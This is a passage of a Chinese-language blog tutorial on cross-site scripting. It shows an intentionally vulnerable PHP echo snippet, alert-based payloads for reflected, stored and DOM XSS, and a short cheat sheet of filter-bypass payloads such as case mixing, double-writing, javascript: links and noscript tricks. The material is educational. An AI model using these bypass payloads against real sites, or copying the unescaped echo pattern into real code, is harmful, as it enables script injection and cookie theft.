+<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="*XSS漏洞"></a>*XSS漏洞</h1><h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><h3 id="1-反射型XSS攻击"><a href="#1-反射型XSS攻击" class="headerlink" title="1.反射型XSS攻击"></a>1.反射型XSS攻击</h3><p>input.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$input</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;input&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;output:&lt;br&gt;&#x27;</span>.<span class="hljs-variable">$input</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p><strong>应对策略：</strong></p>
+<p>通过网页<code>url</code>输入<code>input=&#39;xss&#39;</code>即可。</p>
+<p>将<code>xss</code>替换为危险代码，例如：	<code>					&lt;script&gt;alert(document.cooike)&lt;/script&gt;</code></p>
+<h3 id="2-存储型XSS攻击"><a href="#2-存储型XSS攻击" class="headerlink" title="2.存储型XSS攻击"></a>2.存储型XSS攻击</h3><p><code>$_post</code>输入，影响更持久。</p>
+<p>输入方法和反射型XSS攻击类似（没有过滤的情况下），只不过需要找到<code>post</code>表单提交的地方。</p>
+<h3 id="3-DOM型XSS攻击"><a href="#3-DOM型XSS攻击" class="headerlink" title="3.DOM型XSS攻击"></a>3.DOM型XSS攻击</h3><p><em>查阅  HTML DOM</em></p>
+<p>例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>利用javascript行内式编写：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;onclick=&#x27;</span><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cooike</span>)<br></code></pre></td></tr></table></figure>
+
+<p>连接后变为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;input type=<span class="hljs-string">&#x27;text&#x27;</span> name=<span class="hljs-string">&#x27;name&#x27;</span> id=<span class="hljs-string">&#x27;id&#x27;</span> value=<span class="hljs-string">&#x27;&#x27;</span>onclick=<span class="hljs-string">&#x27;alert(document.cooike)’&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-payloads绕过速查"><a href="#4-payloads绕过速查" class="headerlink" title="4.payloads绕过速查"></a>4.payloads绕过速查</h3><table>
+<thead>
+<tr>
+<th>绕过</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>结合js的html标签</td>
+<td>&lt;IMG οnmοuseοver=&quot;alert(&#39;xxs&#39;)&quot;&gt;    &lt;img src=xss οnerrοr=alert(1)&gt;</td>
+</tr>
+<tr>
+<td>伪协议</td>
+<td><a href=javascript:alert()>xss</a>&gt;</td>
+</tr>
+<tr>
+<td>大小写绕过</td>
+<td><scRipt>alert(“XSS”)</scRipt></td>
+</tr>
+<tr>
+<td>双写绕过</td>
+<td><scrscriptipt>alert(“XSS”);</scrscriptipt></td>
+</tr>
+<tr>
+<td>html编码绕过</td>
+<td>—</td>
+</tr>
+<tr>
+<td>标签优先级绕过</td>
+<td><noscript><img src="asdasd</noscript><img src=* οnerrοr=prompt(1)>" srcset="/img/loading.gif" lazyload></noscript></td>
+</tr>
+</tbody></table>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>测试文章</div>
+      <div>http://example.com/2025/09/11/测试文章/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
